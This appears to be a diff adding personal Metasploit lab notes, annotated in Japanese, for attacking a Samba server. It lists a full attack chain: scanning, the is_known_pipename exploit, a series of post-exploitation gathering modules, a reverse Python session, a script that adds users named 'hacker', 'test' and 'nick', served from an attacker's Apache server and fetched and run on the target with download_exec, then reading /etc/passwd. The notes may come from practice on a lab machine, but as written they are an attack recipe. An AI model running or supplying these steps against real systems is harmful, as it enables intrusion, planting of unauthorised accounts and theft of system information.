@@ -1,0 +1,69 @@
+1) ping
+2) nmap
+3) msfconsole
+4) search samba
+5) use exloit/linux/samba/is_known_pipename
+6) set RHOSTS
+7) check
+8) exploit -z
+9) モジュールについて
+①
+use post/linux/gather/enum_configs
+set SESSION 1
+run
+②
+use post/multi/gather/env
+set SESSION 1
+run
+③
+use post/linux/gather/enum_network
+set SESSION 1
+run
+④
+use post/linux/gather/enum_protections
+set SESSION 1
+run
+⑤
+use post/linux/gather/enum_system
+set SESSION 1
+run
+⑥
+use post/linux/gather/checkcontainer
+set SESSION 1
+run
+⑦
+use post/linux/gather/checkvm
+set SESSION 1
+run
+⑧
+use post/linux/gather/enum_users_history
+set SESSION 1
+run
+⑨
+use post/multi/manage/system_session
+set SESSION 1
+set TYPE python
+set HANDLER true
+set LHOST
+run
+⓾ 
+use post/multi/manage/system_session
+test.shファイルを作成する
+「
+useradd hacker
+useradd test
+useradd nick
+」
+新しいターミナルを起動して、以下のコマンドを実行する
+/etc/init.d/apache2 start
+cp test.sh /var/www/html
+
+use post/linux/manage/download_exec
+set URL http://IPアドレス/test.sh
+set SESSION 1
+run
+
+sessions 
+sessions -i 1
+cat /etc/passwd
+
